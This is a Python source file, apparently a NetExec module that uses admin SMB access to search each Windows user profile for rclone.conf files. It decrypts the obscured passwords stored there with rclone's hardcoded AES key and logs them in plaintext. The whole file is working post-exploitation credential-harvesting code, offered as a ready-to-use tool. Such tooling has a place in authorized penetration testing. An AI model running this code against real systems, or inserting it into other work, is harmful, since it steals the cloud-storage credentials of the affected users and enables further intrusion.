import base64
from Crypto.Cipher import AES
from io import BytesIO

SECRET_KEY = b"\x9c\x93\x5b\x48\x73\x0a\x55\x4d\x6b\xfd\x7c\x63\xc8\x86\xa9\x2b\xd3\x90\x19\x8e\xb8\x12\x8a\xfb\xf4\xde\x16\x2b\x8b\x95\xf6\x38"

def base64_urlsafedecode(string):
    padding = 4 - (len(string) % 4)
    string += "=" * padding
    return base64.urlsafe_b64decode(string)

def deobscure(obscured):
    encrypted_password = base64_urlsafedecode(obscured)
    iv = encrypted_password[:AES.block_size]
    buf = encrypted_password[AES.block_size:]
    crypter = AES.new(key=SECRET_KEY, mode=AES.MODE_CTR, initial_value=iv, nonce=b"")
    return crypter.decrypt(buf).decode("utf-8")

class NXCModule:
    name = "rclone"
    description = "Searches for rclone.conf and deobscures credentials"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True
    privilege = True

    def options(self, context, module_options):
        """No module options."""

    def on_admin_login(self, context, connection):
        self.share = "C$"
        base_dir = "\\Users"
        skip_dirs = {"Public", "Default", "Default User", "All Users"}

        try:
            entries = connection.conn.listPath(self.share, base_dir + "\\*")
        except Exception as e:
            context.log.error(f"Failed to list {base_dir}: {e}")
            return False

        usernames = [
            entry.get_longname()
            for entry in entries
            if entry.is_directory() and entry.get_longname() not in skip_dirs | {".", ".."}
        ]

        if not usernames:
            context.log.warning("No user directories found.")
            return False

        for username in usernames:
            conf_path = f"\\Users\\{username}\\AppData\\Roaming\\rclone\\rclone.conf"
            context.log.info(f"Trying to read: {self.share + conf_path}")
            conf_data = ""

            try:
                buf = BytesIO()
                connection.conn.getFile(self.share, conf_path, buf.write)
                conf_data = buf.getvalue().decode()
            except Exception:
                context.log.info(f"[{username}] rclone.conf not found.")
                continue

            if "RCLONE_ENCRYPT_V0" in conf_data:
                context.log.fail(f"[{username}] Encrypted config — skipping.")
                continue

            context.log.success(f"[{username}] rclone.conf found!")

            for line in conf_data.splitlines():
                line = line.strip()
                if not line:
                    continue
                
                if "=" not in line:
                    context.log.highlight(line.strip())
                    continue

                key, val = map(str.strip, line.split("=", 1))
                if key.lower() in ("pass", "password", "password2"):
                    try:
                        plain = deobscure(val)
                        context.log.highlight(f"{key} = {plain}")
                    except Exception as e:
                        context.log.warning(f"[{username}] Failed to deobscure {key}: {e}")
                else:
                    context.log.highlight(line.strip())

        return True
